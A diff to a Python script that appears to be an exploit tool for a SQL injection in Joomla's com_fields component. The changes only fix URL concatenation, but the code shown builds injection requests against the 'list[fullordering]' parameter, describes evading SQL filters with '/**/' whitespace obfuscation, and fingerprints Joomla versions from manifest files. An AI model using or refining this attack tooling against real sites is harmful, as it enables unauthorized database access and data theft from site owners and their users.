@@ -20,7 +20,7 @@ def print_bad(msg):
 
 def sqli(target, payload):
     # Function responsible to do all SQLi requests, and return the command responses
-    base_url = target + '/' + "index.php?option=com_fields&view=fields&layout=modal&list[fullordering]="
+    base_url = target + "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]="
     
     # Bypass some SQL filters
     # "/**/" is just an obfuscated whitespace trick
@@ -124,7 +124,7 @@ def get_version(target):
     regex_pattern = r'<version>.*(\d+\.\d+\.\d+).*</version>'
     
     # First test is to try to access "/administrator/manifests/files/joomla.xml" 
-    url = target + '/' + "/administrator/manifests/files/joomla.xml"
+    url = target + "/administrator/manifests/files/joomla.xml"
     response = requests.get(url)
     
     if (response.status_code == 200):
@@ -136,7 +136,7 @@ def get_version(target):
     
     # If the first test fails, the second test is executed
     # Second test is to try to access "/language/en-GB/en-GB.xml"
-    url = target + '/' + "/language/en-GB/en-GB.xml"
+    url = target + "/language/en-GB/en-GB.xml"
     response = requests.get(url)
     
     if (response.status_code == 200):
